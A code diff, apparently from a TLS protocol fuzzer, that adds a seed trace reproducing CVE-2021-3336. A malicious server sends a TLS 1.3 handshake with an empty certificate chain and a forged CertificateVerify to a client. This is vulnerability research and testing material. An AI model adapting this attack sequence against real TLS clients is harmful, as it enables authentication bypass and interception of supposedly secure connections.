@@ -793,6 +793,195 @@ pub fn seed_server_attacker_full(client: AgentName) -> Trace<TLSProtocolTypes> {
     }
 }
 
+pub fn seed_server_attacker_full_cve_2021_3336(client: AgentName) -> Trace<TLSProtocolTypes> {
+    let curve = term! {
+        fn_get_any_client_curve(
+            ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientHello)))])
+        )
+    };
+
+    let server_hello = term! {
+          fn_server_hello(
+            fn_protocol_version12,
+            fn_new_random,
+            ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientHello)))]),
+            fn_cipher_suite13_aes_128_gcm_sha256,
+            fn_compression,
+            (fn_server_extensions_make(
+              (fn_server_extensions_append(
+                  (fn_server_extensions_append(
+                      fn_server_extensions_new,
+                      (fn_key_share_server_extension(
+                          (fn_key_share_deterministic((@curve)))
+                      ))
+                  )),
+                  fn_supported_versions13_server_extension
+            ))))
+        )
+    };
+
+    let server_hello_transcript = term! {
+        fn_append_transcript(
+            (fn_append_transcript(
+                fn_new_transcript,
+                ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientHello)))]) // ClientHello
+            )),
+            (@server_hello) // plaintext ServerHello
+        )
+    };
+
+    let encrypted_extensions = term! {
+        fn_encrypted_extensions(
+            fn_server_extensions_new
+        )
+    };
+
+    let certificate = term! {
+        fn_certificate13(
+            (fn_payload_u8((fn_empty_bytes_vec))),
+            (fn_certificate_entries_make(fn_empty_certificate_chain))
+        )
+    };
+
+    let encrypted_extensions_transcript = term! {
+        fn_append_transcript(
+            (@server_hello_transcript),
+            (@encrypted_extensions) // plaintext EncryptedExtensions
+        )
+    };
+
+    let certificate_transcript = term! {
+        fn_append_transcript(
+            (@encrypted_extensions_transcript),
+            (@certificate) // plaintext Certificate
+        )
+    };
+
+    let certificate_verify = term! {
+        fn_certificate_verify(
+            fn_rsa_pss_signature_algorithm,
+            (fn_payload_u16(
+                (fn_rsa_sign_server(
+                    (@certificate_transcript),
+                    fn_alice_key,
+                    fn_rsa_pss_signature_algorithm
+                ))
+            ))
+        )
+    };
+
+    let certificate_verify_transcript = term! {
+        fn_append_transcript(
+            (@certificate_transcript),
+            (@certificate_verify) // plaintext CertificateVerify
+        )
+    };
+
+    let server_finished = term! {
+        fn_finished(
+            (fn_verify_data_server(
+                (@certificate_verify_transcript),
+                //(fn_server_finished_transcript(((client, 0)))),
+                (@server_hello_transcript),
+                (fn_get_client_key_share(((client, 0)), (@curve))),
+                (@curve),
+                fn_no_psk,
+                fn_new_random,
+                fn_cipher_suite13_aes_128_gcm_sha256
+            ))
+        )
+    };
+
+    Trace {
+        prior_traces: vec![],
+        descriptors: vec![AgentDescriptor::from_config(
+            client,
+            TLSDescriptorConfig {
+                tls_version: TLSVersion::V1_3,
+                typ: AgentType::Client,
+                ..TLSDescriptorConfig::default()
+            },
+        )],
+        steps: vec![
+            OutputAction::new_step(client),
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { server_hello
+                }),
+            },
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { term! {
+                        fn_encrypt_handshake(
+                            (@encrypted_extensions),
+                            (@server_hello_transcript),
+                            (fn_get_client_key_share(((client, 0)), (@curve))),
+                            fn_no_psk,
+                            (@curve),
+                            fn_false,
+                            fn_seq_0,  // sequence 0
+                            fn_new_random,
+                            fn_cipher_suite13_aes_128_gcm_sha256
+                        )
+                    }
+                }),
+            },
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { term! {
+                        fn_encrypt_handshake(
+                            (@certificate),
+                            (@server_hello_transcript),
+                            (fn_get_client_key_share(((client, 0)), (@curve))),
+                            fn_no_psk,
+                            (@curve),
+                            fn_false,
+                            fn_seq_1,  // sequence 1
+                            fn_new_random,
+                            fn_cipher_suite13_aes_128_gcm_sha256
+                        )
+                    }
+                }),
+            },
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { term! {
+                        fn_encrypt_handshake(
+                            (@certificate_verify),
+                            (@server_hello_transcript),
+                            (fn_get_client_key_share(((client, 0)), (@curve))),
+                            fn_no_psk,
+                            (@curve),
+                            fn_false,
+                            fn_seq_2,  // sequence 2
+                            fn_new_random,
+                            fn_cipher_suite13_aes_128_gcm_sha256
+                        )
+                    }
+                }),
+            },
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { term! {
+                        fn_encrypt_handshake(
+                            (@server_finished),
+                            (@server_hello_transcript),
+                            (fn_get_client_key_share(((client, 0)), (@curve))),
+                            fn_no_psk,
+                            (@curve),
+                            fn_false,
+                            fn_seq_3,  // sequence 3
+                            fn_new_random,
+                            fn_cipher_suite13_aes_128_gcm_sha256
+                        )
+                    }
+                }),
+            },
+        ],
+        ..Default::default()
+    }
+}
+
 pub fn seed_server_attacker_full_coalesced(client: AgentName) -> Trace<TLSProtocolTypes> {
     let curve = term! {
         fn_get_any_client_curve(
